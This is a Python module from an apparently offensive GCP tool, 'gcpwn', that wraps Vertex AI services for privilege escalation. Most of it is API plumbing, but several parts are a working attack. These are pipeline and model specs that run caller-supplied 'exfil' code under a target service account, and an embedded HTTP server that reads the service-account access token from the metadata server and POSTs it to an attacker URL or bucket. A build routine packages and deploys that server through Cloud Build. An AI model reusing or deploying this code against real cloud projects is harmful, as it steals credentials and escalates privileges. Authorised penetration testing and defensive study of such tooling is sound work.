from __future__ import annotations

import time
from typing import Any

import requests as _rlib

from gcpwn.core.resource import GcpListResource
from gcpwn.core.utils.action_recording import record_permissions
from gcpwn.core.utils.service_runtime import get_bearer_token
from gcpwn.core.utils.module_helpers import (
    region_resolver_for,
    static_locations,
)

_AI_BASE = "https://aiplatform.googleapis.com/v1"
_AI_BETA_BASE = "https://aiplatform.googleapis.com/v1beta1"


def _get_project_number(session, project_id: str) -> str:
    """Fetch project number via Resource Manager SDK."""
    from google.cloud import resourcemanager_v3
    try:
        client = resourcemanager_v3.ProjectsClient(credentials=session.credentials)
        proj = client.get_project(name=f"projects/{project_id}")
        return str(proj.project_number)
    except Exception:
        return ""

resolve_locations = region_resolver_for("vertex")
_DEFAULT_REGIONS = static_locations("vertex")


def _req(tok: str, method: str, url: str, body=None, params=None) -> dict:
    hdrs = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}
    fn = {"GET": _rlib.get, "POST": _rlib.post, "PUT": _rlib.put,
          "PATCH": _rlib.patch, "DELETE": _rlib.delete}[method]
    r = fn(url, headers=hdrs, json=body, params=params, timeout=30)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, {"_raw": r.text[:600]}


def _list_paged(tok: str, url: str, key: str, page_size: int = 100) -> list[dict]:
    results, page_token = [], None
    while True:
        params: dict = {"pageSize": page_size}
        if page_token:
            params["pageToken"] = page_token
        r = _rlib.get(url, headers={"Authorization": f"Bearer {tok}"}, params=params, timeout=20)
        if r.status_code != 200:
            return results
        data = r.json()
        results.extend(data.get(key, []))
        page_token = data.get("nextPageToken")
        if not page_token:
            break
    return results


def _lro_wait(tok: str, lro_name: str, region_base: str, timeout: int = 300) -> dict:
    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(10)
        r = _rlib.get(
            f"{region_base}/{lro_name}",
            headers={"Authorization": f"Bearer {tok}"},
            timeout=20,
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("done"):
                return data
    return {}


def _sa_from_job(job: dict) -> str:
    for field in ("jobSpec", "trainingTaskInputs"):
        sub = job.get(field, {})
        if isinstance(sub, dict):
            sa = sub.get("serviceAccount", "")
            if sa:
                return sa
    return job.get("serviceAccount", "")


class _VertexRestResource(GcpListResource):
    """Base class for Vertex AI REST-based resources."""

    COLLECTION_KEY: str = ""
    API_BASE: str = _AI_BASE
    API_PATH: str = ""

    def _build_client(self, session):
        return None

    def list(self, *, project_id=None, location=None, parent=None, action_dict=None, **_):
        tok = get_bearer_token(self.session)
        url = f"{self.API_BASE}/{parent or f'projects/{project_id}/locations/{location}'}/{self.API_PATH}"
        items = _list_paged(tok, url, self.COLLECTION_KEY)
        if items is not None and self.LIST_PERMISSION:
            record_permissions(
                action_dict,
                permissions=self.LIST_PERMISSION,
                scope_key="project_permissions",
                scope_label=project_id,
            )
        return [self._normalize(i) for i in (items or [])]

    def _normalize(self, raw: dict[str, Any]) -> dict[str, Any]:
        return raw

    def _extra_save_fields(self, raw: dict[str, Any]) -> dict[str, Any]:
        return {}


class VertexCustomJobsResource(_VertexRestResource):
    SERVICE_LABEL = "Vertex AI Custom Jobs"
    TABLE_NAME = "vertex_custom_jobs"
    COLUMNS = ["location", "job_id", "name", "state", "service_account", "create_time"]
    ACTION_RESOURCE_TYPE = "customJobs"
    LIST_PERMISSION = "aiplatform.customJobs.list"
    GET_PERMISSION = "aiplatform.customJobs.get"
    ID_FIELD = "job_id"
    COLLECTION_KEY = "customJobs"
    API_PATH = "customJobs"

    def _normalize(self, raw: dict[str, Any]) -> dict[str, Any]:
        name = raw.get("name", "")
        return {
            "name": name,
            "job_id": name.split("/")[-1] if "/" in name else name,
            "state": raw.get("state", ""),
            "service_account": _sa_from_job(raw),
            "create_time": str(raw.get("createTime", "") or "")[:19],
        }

    def create(self, parent: str, body: dict) -> dict:
        tok = get_bearer_token(self.session)
        _, resp = _req(tok, "POST", f"{self.API_BASE}/{parent}/customJobs", body=body)
        return resp

    def cancel(self, name: str) -> None:
        tok = get_bearer_token(self.session)
        _req(tok, "POST", f"{self.API_BASE}/{name}:cancel", body={})

    def delete(self, name: str) -> None:
        tok = get_bearer_token(self.session)
        _req(tok, "DELETE", f"{self.API_BASE}/{name}")

    def poll(self, name: str, timeout: int = 3600) -> dict:
        deadline = time.time() + timeout
        while time.time() < deadline:
            time.sleep(15)
            tok = get_bearer_token(self.session)
            r = _rlib.get(
                f"{self.API_BASE}/{name}",
                headers={"Authorization": f"Bearer {tok}"},
                timeout=20,
            )
            if r.status_code == 200:
                data = r.json()
                state = data.get("state", "")
                if state in ("JOB_STATE_SUCCEEDED", "JOB_STATE_FAILED",
                             "JOB_STATE_CANCELLED", "JOB_STATE_EXPIRED"):
                    return data
        return {}

    def _gapic_client(self, region: str):
        """Build a regional GAPIC JobServiceClient (cached by region)."""
        from google.cloud import aiplatform_v1
        from google.api_core.client_options import ClientOptions
        if not hasattr(self, "_gapic_clients"):
            self._gapic_clients = {}
        if region not in self._gapic_clients:
            self._gapic_clients[region] = aiplatform_v1.JobServiceClient(
                credentials=self.session.credentials,
                client_options=ClientOptions(api_endpoint=f"{region}-aiplatform.googleapis.com:443"),
            )
        return self._gapic_clients[region]

    def create_gapic(self, *, parent: str, region: str, custom_job) -> object:
        """Create a CustomJob via GAPIC proto; returns the created CustomJob."""
        return self._gapic_client(region).create_custom_job(parent=parent, custom_job=custom_job)

    def get_gapic(self, *, name: str, region: str) -> object:
        """Fetch current CustomJob state via GAPIC."""
        return self._gapic_client(region).get_custom_job(name=name)

    def cancel_gapic(self, *, name: str, region: str) -> None:
        """Cancel a running CustomJob via GAPIC (swallows errors)."""
        try:
            self._gapic_client(region).cancel_custom_job(name=name)
        except Exception:
            pass

    def delete_gapic(self, *, name: str, region: str) -> None:
        """Delete a CustomJob via GAPIC (swallows errors)."""
        try:
            self._gapic_client(region).delete_custom_job(name=name)
        except Exception:
            pass

    def poll_until_terminal_gapic(self, *, name: str, region: str, timeout: int = 60) -> object:
        """Poll until the job reaches a terminal state or timeout expires."""
        import time as _time
        from google.cloud import aiplatform_v1
        terminal = {
            aiplatform_v1.JobState.JOB_STATE_SUCCEEDED,
            aiplatform_v1.JobState.JOB_STATE_FAILED,
            aiplatform_v1.JobState.JOB_STATE_CANCELLED,
            aiplatform_v1.JobState.JOB_STATE_PAUSED,
        }
        deadline = _time.time() + timeout
        client = self._gapic_client(region)
        while _time.time() < deadline:
            _time.sleep(8)
            j = client.get_custom_job(name=name)
            if j.state in terminal:
                return j
        return client.get_custom_job(name=name)


class VertexPipelineJobsResource(_VertexRestResource):
    SERVICE_LABEL = "Vertex AI Pipeline Jobs"
    TABLE_NAME = "vertex_pipeline_jobs"
    COLUMNS = ["location", "job_id", "name", "state", "service_account", "create_time"]
    ACTION_RESOURCE_TYPE = "pipelineJobs"
    LIST_PERMISSION = "aiplatform.pipelineJobs.list"
    GET_PERMISSION = "aiplatform.pipelineJobs.get"
    ID_FIELD = "job_id"
    COLLECTION_KEY = "pipelineJobs"
    API_PATH = "pipelineJobs"

    def _normalize(self, raw: dict[str, Any]) -> dict[str, Any]:
        name = raw.get("name", "")
        return {
            "name": name,
            "job_id": name.split("/")[-1] if "/" in name else name,
            "state": raw.get("state", ""),
            "service_account": raw.get("serviceAccount", ""),
            "create_time": str(raw.get("createTime", "") or "")[:19],
        }

    @staticmethod
    def build_pipeline_spec(exfil_code: str) -> str:
        import json as _json
        spec = {
            "pipelineInfo": {"name": "gcpwn-pe"},
            "schemaVersion": "2.1.0",
            "sdkVersion": "kfp-2.0.0",
            "deploymentSpec": {
                "executors": {
                    "exec-exfil": {
                        "container": {
                            "image": "python:3.11-slim",
                            "command": ["python3", "-c", exfil_code],
                        }
                    }
                }
            },
            "components": {
                "comp-exfil": {
                    "executorLabel": "exec-exfil",
                }
            },
            "root": {
                "dag": {
                    "tasks": {
                        "exfil": {
                            "taskInfo": {"name": "exfil"},
                            "cachingOptions": {"enableCache": False},
                            "componentRef": {"name": "comp-exfil"},
                        }
                    }
                }
            },
        }
        return _json.dumps(spec)

    def _gapic_client(self, region: str):
        """Build a regional GAPIC PipelineServiceClient (cached by region)."""
        from google.cloud import aiplatform_v1
        from google.api_core.client_options import ClientOptions
        if not hasattr(self, "_gapic_clients"):
            self._gapic_clients = {}
        if region not in self._gapic_clients:
            self._gapic_clients[region] = aiplatform_v1.PipelineServiceClient(
                credentials=self.session.credentials,
                client_options=ClientOptions(api_endpoint=f"{region}-aiplatform.googleapis.com:443"),
            )
        return self._gapic_clients[region]

    def create_gapic(self, *, parent: str, region: str, pipeline_job) -> object:
        """Create a PipelineJob via GAPIC proto; returns the created PipelineJob."""
        return self._gapic_client(region).create_pipeline_job(parent=parent, pipeline_job=pipeline_job)

    def get_gapic(self, *, name: str, region: str) -> object:
        """Fetch current PipelineJob state via GAPIC."""
        return self._gapic_client(region).get_pipeline_job(name=name)

    def cancel_gapic(self, *, name: str, region: str) -> None:
        """Cancel a running PipelineJob via GAPIC (swallows errors)."""
        try:
            self._gapic_client(region).cancel_pipeline_job(name=name)
        except Exception:
            pass

    def delete_gapic(self, *, name: str, region: str) -> None:
        """Delete a PipelineJob via GAPIC (swallows errors)."""
        try:
            self._gapic_client(region).delete_pipeline_job(name=name)
        except Exception:
            pass


class VertexDeploymentResourcePoolsResource(_VertexRestResource):
    SERVICE_LABEL = "Vertex AI Deployment Resource Pools"
    TABLE_NAME = "vertex_deployment_resource_pools"
    COLUMNS = ["location", "pool_id", "name", "service_account", "machine_type", "create_time"]
    ACTION_RESOURCE_TYPE = "deploymentResourcePools"
    LIST_PERMISSION = "aiplatform.deploymentResourcePools.list"
    GET_PERMISSION = "aiplatform.deploymentResourcePools.get"
    ID_FIELD = "pool_id"
    COLLECTION_KEY = "deploymentResourcePools"
    API_PATH = "deploymentResourcePools"

    def _normalize(self, raw: dict[str, Any]) -> dict[str, Any]:
        name = raw.get("name", "")
        dedicated = raw.get("dedicatedResources", {}) or {}
        machine_spec = dedicated.get("machineSpec", {}) or {}
        return {
            "name": name,
            "pool_id": name.split("/")[-1] if "/" in name else name,
            "service_account": raw.get("serviceAccount", ""),
            "machine_type": machine_spec.get("machineType", ""),
            "create_time": str(raw.get("createTime", "") or "")[:19],
        }

    def create(self, parent: str, pool_id: str, body: dict) -> dict:
        tok = get_bearer_token(self.session)
        _, resp = _req(tok, "POST", f"{self.API_BASE}/{parent}/deploymentResourcePools",
                       body=body, params={"deploymentResourcePoolId": pool_id})
        return resp

    def patch(self, name: str, body: dict, update_mask: str) -> dict:
        tok = get_bearer_token(self.session)
        _, resp = _req(tok, "PATCH", f"{self.API_BASE}/{name}",
                       body=body, params={"updateMask": update_mask})
        return resp

    def delete(self, name: str) -> None:
        tok = get_bearer_token(self.session)
        _req(tok, "DELETE", f"{self.API_BASE}/{name}")

    def poll_lro(self, lro_name: str, region: str, timeout: int = 120) -> dict:
        base = f"https://{region}-aiplatform.googleapis.com/v1"
        tok = get_bearer_token(self.session)
        return _lro_wait(tok, lro_name, base, timeout=timeout)

    @staticmethod
    def get_project_number(session, project_id: str) -> str:
        return _get_project_number(session, project_id)

    @staticmethod
    def create_drp(tok: str, project_id: str, region: str, pool_id: str,
                   machine_type: str, min_replicas: int, target_sa: str) -> tuple[int, dict]:
        url = (f"https://{region}-aiplatform.googleapis.com/v1"
               f"/projects/{project_id}/locations/{region}/deploymentResourcePools")
        body = {
            "deploymentResourcePool": {
                "dedicatedResources": {
                    "machineSpec": {"machineType": machine_type},
                    "minReplicaCount": min_replicas,
                    "maxReplicaCount": min_replicas,
                },
                "serviceAccount": target_sa,
            },
            "deploymentResourcePoolId": pool_id,
        }
        r = _rlib.post(url, json=body,
                       headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
                       timeout=30)
        return r.status_code, r.json() if r.content else {}

    @staticmethod
    def poll_drp_lro(tok: str, op_name: str, timeout: int, interval: int = 15) -> dict | None:
        from gcpwn.core.console import UtilityTools
        url = f"https://us-central1-aiplatform.googleapis.com/v1/{op_name}"
        if op_name.startswith("projects/"):
            parts = op_name.split("/")
            if len(parts) >= 4 and parts[2] == "locations":
                region = parts[3]
                url = f"https://{region}-aiplatform.googleapis.com/v1/{op_name}"
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                r = _rlib.get(url, headers={"Authorization": f"Bearer {tok}"}, timeout=15)
                op = r.json() if r.content else {}
                status = "done" if op.get("done") else "pending"
                err = op.get("error", {})
                print(f"  [lro] {op_name.split('/')[-1]}: {status}" +
                      (f" — error {err.get('code')}: {err.get('message','')}" if err else ""),
                      flush=True)
                if op.get("done"):
                    return op
            except Exception as exc:
                print(f"  [lro] poll error: {exc}", flush=True)
            time.sleep(interval)
        print(f"{UtilityTools.YELLOW}  [lro] Timed out after {timeout}s{UtilityTools.RESET}", flush=True)
        return None

    @staticmethod
    def get_drp(tok: str, project_id: str, region: str, pool_id: str) -> tuple[int, dict]:
        url = (f"https://{region}-aiplatform.googleapis.com/v1"
               f"/projects/{project_id}/locations/{region}/deploymentResourcePools/{pool_id}")
        r = _rlib.get(url, headers={"Authorization": f"Bearer {tok}"}, timeout=15)
        return r.status_code, r.json() if r.content else {}

    @staticmethod
    def delete_drp(tok: str, project_id: str, region: str, pool_id: str) -> int:
        url = (f"https://{region}-aiplatform.googleapis.com/v1"
               f"/projects/{project_id}/locations/{region}/deploymentResourcePools/{pool_id}")
        r = _rlib.delete(url, headers={"Authorization": f"Bearer {tok}"}, timeout=15)
        return r.status_code

    @staticmethod
    def create_drp_endpoint(tok: str, project_id: str, region: str,
                             display_name: str) -> tuple[int, dict]:
        url = (f"https://{region}-aiplatform.googleapis.com/v1"
               f"/projects/{project_id}/locations/{region}/endpoints")
        body = {"displayName": display_name}
        r = _rlib.post(url, json=body,
                       headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
                       timeout=30)
        return r.status_code, r.json() if r.content else {}

    @staticmethod
    def create_drp_model(tok: str, project_id: str, region: str,
                          display_name: str, exfil_script: str,
                          image_uri: str = "") -> tuple[int, dict]:
        url = (f"https://{region}-aiplatform.googleapis.com/v1"
               f"/projects/{project_id}/locations/{region}/models:upload")
        body = {
            "model": {
                "displayName": display_name,
                "containerSpec": {
                    "imageUri": image_uri or "python:3.11-slim",
                    "command": ["python3", "-c", exfil_script],
                    "ports": [{"containerPort": 8080}],
                    "healthRoute": "/",
                    "predictRoute": "/predict",
                },
            },
        }
        r = _rlib.post(url, json=body,
                       headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
                       timeout=30)
        try:
            return r.status_code, r.json() if r.content else {}
        except Exception:
            return r.status_code, {"_raw": r.text[:400]}

    @staticmethod
    def deploy_drp_model(tok: str, project_id: str, region: str,
                          endpoint_id: str, model_resource_name: str,
                          drp_resource_name: str, display_name: str,
                          service_account: str = "") -> tuple[int, dict]:
        url = (f"https://{region}-aiplatform.googleapis.com/v1"
               f"/projects/{project_id}/locations/{region}/endpoints/{endpoint_id}:deployModel")
        deployed_model: dict = {
            "model": model_resource_name,
            "displayName": display_name,
            "sharedResources": drp_resource_name,
        }
        # The deployed model's serviceAccount must match the DRP's serviceAccount when set.
        if service_account:
            deployed_model["serviceAccount"] = service_account
        body = {"deployedModel": deployed_model}
        r = _rlib.post(url, json=body,
                       headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
                       timeout=30)
        return r.status_code, r.json() if r.content else {}

    @staticmethod
    def delete_drp_endpoint(tok: str, project_id: str, region: str, endpoint_id: str) -> int:
        url = (f"https://{region}-aiplatform.googleapis.com/v1"
               f"/projects/{project_id}/locations/{region}/endpoints/{endpoint_id}")
        r = _rlib.delete(url, headers={"Authorization": f"Bearer {tok}"}, timeout=15)
        return r.status_code

    @staticmethod
    def delete_drp_model(tok: str, project_id: str, region: str, model_id: str) -> int:
        url = (f"https://{region}-aiplatform.googleapis.com/v1"
               f"/projects/{project_id}/locations/{region}/models/{model_id}")
        r = _rlib.delete(url, headers={"Authorization": f"Bearer {tok}"}, timeout=15)
        return r.status_code


_MINIMAL_TUNING_DATASET_JSONL = """\
{"contents": [{"role": "user", "parts": [{"text": "Hello"}]}, {"role": "model", "parts": [{"text": "Hi there!"}]}]}
{"contents": [{"role": "user", "parts": [{"text": "What is GCP?"}]}, {"role": "model", "parts": [{"text": "Google Cloud Platform."}]}]}
{"contents": [{"role": "user", "parts": [{"text": "What is PE?"}]}, {"role": "model", "parts": [{"text": "Privilege escalation."}]}]}
{"contents": [{"role": "user", "parts": [{"text": "Describe metadata server"}]}, {"role": "model", "parts": [{"text": "169.254.169.254 endpoint."}]}]}
{"contents": [{"role": "user", "parts": [{"text": "Name a GCP region"}]}, {"role": "model", "parts": [{"text": "us-central1."}]}]}
"""


class VertexTuningJobsResource(_VertexRestResource):
    SERVICE_LABEL = "Vertex AI Tuning Jobs"
    TABLE_NAME = "vertex_tuning_jobs"
    COLUMNS = ["location", "job_id", "name", "state", "service_account", "create_time"]
    ACTION_RESOURCE_TYPE = "tuningJobs"
    LIST_PERMISSION = "aiplatform.tuningJobs.list"
    GET_PERMISSION = "aiplatform.tuningJobs.get"
    ID_FIELD = "job_id"
    COLLECTION_KEY = "tuningJobs"
    API_PATH = "tuningJobs"

    def _normalize(self, raw: dict[str, Any]) -> dict[str, Any]:
        name = raw.get("name", "")
        return {
            "name": name,
            "job_id": name.split("/")[-1] if "/" in name else name,
            "state": raw.get("state", ""),
            "service_account": raw.get("serviceAccount", ""),
            "create_time": str(raw.get("createTime", "") or "")[:19],
        }

    def create(self, parent: str, body: dict) -> dict:
        tok = get_bearer_token(self.session)
        _, resp = _req(tok, "POST", f"{self.API_BASE}/{parent}/tuningJobs", body=body)
        return resp

    def cancel(self, name: str) -> None:
        tok = get_bearer_token(self.session)
        _req(tok, "POST", f"{self.API_BASE}/{name}:cancel", body={})

    def delete(self, name: str) -> None:
        tok = get_bearer_token(self.session)
        _req(tok, "DELETE", f"{self.API_BASE}/{name}")

    @staticmethod
    def ensure_dataset(session, project: str, region: str) -> str | None:
        from google.cloud import storage as _gcs
        from google.api_core import exceptions as gax_exceptions
        from gcpwn.core.console import UtilityTools
        bucket_name = f"{project}-gcpwn-tune-staging"
        blob_name = "gcpwn-pe-tuning-dataset.jsonl"
        gcs = _gcs.Client(credentials=session.credentials, project=project)
        try:
            gcs.create_bucket(bucket_name, location=region)
        except gax_exceptions.Conflict:
            pass  # bucket already exists
        except Exception as e:
            print(f"  {UtilityTools.YELLOW}[!] Could not create staging bucket: {e}. "
                  f"Use --dataset-gcs to provide your own dataset.{UtilityTools.RESET}")
            return None
        try:
            blob = gcs.bucket(bucket_name).blob(blob_name)
            blob.upload_from_string(_MINIMAL_TUNING_DATASET_JSONL.encode(),
                                    content_type="application/octet-stream")
        except Exception as e:
            print(f"  {UtilityTools.YELLOW}[!] Dataset upload failed: {e}.{UtilityTools.RESET}")
            return None
        uri = f"gs://{bucket_name}/{blob_name}"
        print(f"  Dataset uploaded to {uri}")
        return uri


class VertexReasoningEnginesResource(_VertexRestResource):
    SERVICE_LABEL = "Vertex AI Reasoning Engines"
    TABLE_NAME = "vertex_reasoning_engines"
    COLUMNS = ["location", "engine_id", "name", "service_account", "display_name", "create_time"]
    ACTION_RESOURCE_TYPE = "reasoningEngines"
    LIST_PERMISSION = "aiplatform.reasoningEngines.list"
    GET_PERMISSION = "aiplatform.reasoningEngines.get"
    ID_FIELD = "engine_id"
    COLLECTION_KEY = "reasoningEngines"
    API_PATH = "reasoningEngines"
    API_BASE = _AI_BETA_BASE

    def _normalize(self, raw: dict[str, Any]) -> dict[str, Any]:
        name = raw.get("name", "")
        spec = raw.get("spec", {}) or {}
        return {
            "name": name,
            "engine_id": name.split("/")[-1] if "/" in name else name,
            "service_account": spec.get("serviceAccount", "") or raw.get("effectiveIdentity", ""),
            "display_name": raw.get("displayName", ""),
            "create_time": str(raw.get("createTime", "") or "")[:19],
        }

    def create(self, parent: str, body: dict) -> dict:
        tok = get_bearer_token(self.session)
        _, resp = _req(tok, "POST", f"{self.API_BASE}/{parent}/reasoningEngines", body=body)
        return resp

    def patch(self, name: str, body: dict, update_mask: str) -> dict:
        tok = get_bearer_token(self.session)
        _, resp = _req(tok, "PATCH", f"{self.API_BASE}/{name}",
                       body=body, params={"updateMask": update_mask})
        return resp

    def delete(self, name: str) -> None:
        tok = get_bearer_token(self.session)
        _req(tok, "DELETE", f"{self.API_BASE}/{name}")

    @staticmethod
    def wait_for_lro(tok: str, lro_name: str, region: str, timeout: int = 300) -> dict | None:
        deadline = time.time() + timeout
        while time.time() < deadline:
            time.sleep(15)
            s, resp = _req(tok, "GET",
                           f"https://{region}-aiplatform.googleapis.com/v1beta1/{lro_name}")
            if s == 200 and resp.get("done"):
                return resp
        return None


_ENDPOINT_EXFIL_SERVER_PY = '''\
import http.server, urllib.request, json, threading, sys, os, time

EXFIL_URL = os.environ.get("GCPWN_EXFIL_URL", "")
OUTPUT_BUCKET = os.environ.get("GCPWN_OUTPUT_BUCKET", "")
DONE = threading.Event()

IMDS_BASE = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/"
IMDS_H = {"Metadata-Flavor": "Google"}

def _get_token():
    try:
        tok = json.loads(urllib.request.urlopen(
            urllib.request.Request(IMDS_BASE + "token", headers=IMDS_H)).read()
        ).get("access_token", "")
        eml = urllib.request.urlopen(
            urllib.request.Request(IMDS_BASE + "email", headers=IMDS_H)).read().decode().strip()
        return eml, tok
    except Exception as e:
        return "", f"ERROR:{e}"

def _exfil(eml, tok):
    print(f"{marker_eml}{eml}", flush=True)
    print(f"{marker_tok}{tok}", flush=True)
    if EXFIL_URL:
        try:
            urllib.request.urlopen(urllib.request.Request(
                EXFIL_URL, method="POST",
                data=json.dumps({"source": "vertex-endpoint", "email": eml, "token": tok}).encode(),
                headers={"Content-Type": "application/json"}), timeout=10)
        except Exception as e:
            print(f"exfil_url error: {e}", flush=True)
    if OUTPUT_BUCKET:
        try:
            import subprocess
            subprocess.run(["gsutil", "cp", "-",
                f"gs://{OUTPUT_BUCKET}/gcpwn-endpoint-proof.txt"],
                input=f"email={eml}\\ntoken_prefix={tok[:50]}".encode(), timeout=30)
        except Exception as e:
            print(f"gcs error: {e}", flush=True)

marker_eml = "GCPWN_ENDPOINT_EMAIL="
marker_tok = "GCPWN_ENDPOINT_TOKEN="

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        _ = self.rfile.read(length)
        eml, tok = _get_token()
        _exfil(eml, tok)
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.end_headers(); self.wfile.write(json.dumps({"predictions": [{"status":"ok"}]}).encode())
        DONE.set()

threading.Thread(target=lambda: (time.sleep(10), _get_token() and _exfil(*_get_token())), daemon=True).start()
http.server.HTTPServer(("0.0.0.0", 8080), H).serve_forever()
'''

_ENDPOINT_DOCKERFILE = '''\
FROM python:3.11-slim
WORKDIR /app
COPY server.py .
ENTRYPOINT ["python", "server.py"]
'''

_ENDPOINT_CLOUDBUILD_YAML = '''\
steps:
- name: 'gcr.io/cloud-builders/docker'
  args: ['build', '-t', '{image}', '.']
- name: 'gcr.io/cloud-builders/docker'
  args: ['push', '{image}']
images: ['{image}']
'''


class VertexEndpointsResource(_VertexRestResource):
    SERVICE_LABEL = "Vertex AI Endpoints"
    TABLE_NAME = "vertex_endpoints"
    COLUMNS = ["location", "endpoint_id", "name", "display_name", "create_time"]
    ACTION_RESOURCE_TYPE = "endpoints"
    LIST_PERMISSION = "aiplatform.endpoints.list"
    GET_PERMISSION = "aiplatform.endpoints.get"
    ID_FIELD = "endpoint_id"
    COLLECTION_KEY = "endpoints"
    API_PATH = "endpoints"

    def _normalize(self, raw: dict[str, Any]) -> dict[str, Any]:
        name = raw.get("name", "")
        return {
            "name": name,
            "endpoint_id": name.split("/")[-1] if "/" in name else name,
            "display_name": raw.get("displayName", ""),
            "create_time": str(raw.get("createTime", "") or "")[:19],
        }

    def create(self, parent: str, body: dict) -> dict:
        tok = get_bearer_token(self.session)
        _, resp = _req(tok, "POST", f"{self.API_BASE}/{parent}/endpoints", body=body)
        return resp

    def deploy_model(self, endpoint_name: str, body: dict, region: str) -> dict:
        tok = get_bearer_token(self.session)
        regional_base = f"https://{region}-aiplatform.googleapis.com/v1"
        _, resp = _req(tok, "POST", f"{regional_base}/{endpoint_name}:deployModel", body=body)
        return resp

    def undeploy_model(self, endpoint_name: str, deployed_model_id: str, region: str) -> dict:
        tok = get_bearer_token(self.session)
        regional_base = f"https://{region}-aiplatform.googleapis.com/v1"
        _, resp = _req(tok, "POST", f"{regional_base}/{endpoint_name}:undeployModel",
                       body={"deployedModelId": deployed_model_id})
        return resp

    def delete(self, name: str, region: str) -> None:
        tok = get_bearer_token(self.session)
        regional_base = f"https://{region}-aiplatform.googleapis.com/v1"
        _req(tok, "DELETE", f"{regional_base}/{name}")

    def poll_lro(self, lro_name: str, region: str, timeout: int = 300) -> dict:
        base = f"https://{region}-aiplatform.googleapis.com/v1"
        tok = get_bearer_token(self.session)
        return _lro_wait(tok, lro_name, base, timeout=timeout)

    @staticmethod
    def build_and_push_image(session, project: str, region: str, image: str,
                              exfil_url: str, output_bucket: str) -> bool:
        import io, tarfile
        from gcpwn.core.console import UtilityTools
        build_yaml = _ENDPOINT_CLOUDBUILD_YAML.format(image=image)
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for fname, content in [
                ("server.py", _ENDPOINT_EXFIL_SERVER_PY),
                ("Dockerfile", _ENDPOINT_DOCKERFILE),
                ("cloudbuild.yaml", build_yaml),
            ]:
                data = content.encode()
                info = tarfile.TarInfo(name=fname)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        tar_bytes = buf.getvalue()
        staging_bucket = f"{project}-gcpwn-vertex-staging"
        blob_name = f"gcpwn-endpoint-src-{int(time.time())}.tar.gz"
        from google.cloud import storage as _gcs
        from google.cloud.devtools import cloudbuild_v1
        from google.api_core import exceptions as gax_exceptions
        gcs = _gcs.Client(credentials=session.credentials, project=project)
        try:
            gcs.create_bucket(staging_bucket, location=region)
        except gax_exceptions.Conflict:
            pass
        except Exception as e:
            print(f"  {UtilityTools.YELLOW}[!] Could not create staging bucket: {e}.{UtilityTools.RESET}")
            return False
        try:
            blob = gcs.bucket(staging_bucket).blob(blob_name)
            blob.upload_from_string(tar_bytes, content_type="application/gzip")
        except Exception as e:
            print(f"  {UtilityTools.YELLOW}[!] Source upload failed: {e}.{UtilityTools.RESET}")
            return False
        cb = cloudbuild_v1.CloudBuildClient(credentials=session.credentials)
        build_req = cloudbuild_v1.Build(
            source=cloudbuild_v1.Source(
                storage_source=cloudbuild_v1.StorageSource(bucket=staging_bucket, object_=blob_name)
            ),
            steps=[
                cloudbuild_v1.BuildStep(
                    name="gcr.io/cloud-builders/docker",
                    args=["build", "--build-arg", f"GCPWN_EXFIL_URL={exfil_url}",
                          "--build-arg", f"GCPWN_OUTPUT_BUCKET={output_bucket}",
                          "-t", image, "."],
                ),
                cloudbuild_v1.BuildStep(
                    name="gcr.io/cloud-builders/docker",
                    args=["push", image],
                ),
            ],
            images=[image],
        )
        try:
            operation = cb.create_build(project_id=project, build=build_req)
            build_id = operation.metadata.build.id if operation.metadata else ""
            print(f"  Cloud Build started: {build_id}")
            result = operation.result(timeout=600)
            status = result.status.name if hasattr(result.status, "name") else str(result.status)
            if status == "SUCCESS":
                print(f"  {UtilityTools.GREEN}[+] Image built and pushed: {image}{UtilityTools.RESET}")
                return True
            print(f"  {UtilityTools.RED}[!] Cloud Build {status}{UtilityTools.RESET}")
            return False
        except Exception as e:
            print(f"  {UtilityTools.YELLOW}[!] Cloud Build failed: {e}.{UtilityTools.RESET}")
            return False


class VertexModelsResource(_VertexRestResource):
    SERVICE_LABEL = "Vertex AI Models"
    TABLE_NAME = "vertex_models"
    COLUMNS = ["location", "model_id", "name", "display_name", "create_time"]
    ACTION_RESOURCE_TYPE = "models"
    LIST_PERMISSION = "aiplatform.models.list"
    GET_PERMISSION = "aiplatform.models.get"
    ID_FIELD = "model_id"
    COLLECTION_KEY = "models"
    API_PATH = "models"

    def _normalize(self, raw: dict[str, Any]) -> dict[str, Any]:
        name = raw.get("name", "")
        return {
            "name": name,
            "model_id": name.split("/")[-1] if "/" in name else name,
            "display_name": raw.get("displayName", ""),
            "create_time": str(raw.get("createTime", "") or "")[:19],
        }

    def upload(self, parent: str, body: dict) -> dict:
        tok = get_bearer_token(self.session)
        _, resp = _req(tok, "POST", f"{self.API_BASE}/{parent}/models:upload", body=body)
        return resp

    def delete(self, name: str) -> None:
        tok = get_bearer_token(self.session)
        _req(tok, "DELETE", f"{self.API_BASE}/{name}")

    def poll_lro(self, lro_name: str, region: str, timeout: int = 300) -> dict:
        base = f"https://{region}-aiplatform.googleapis.com/v1"
        tok = get_bearer_token(self.session)
        return _lro_wait(tok, lro_name, base, timeout=timeout)
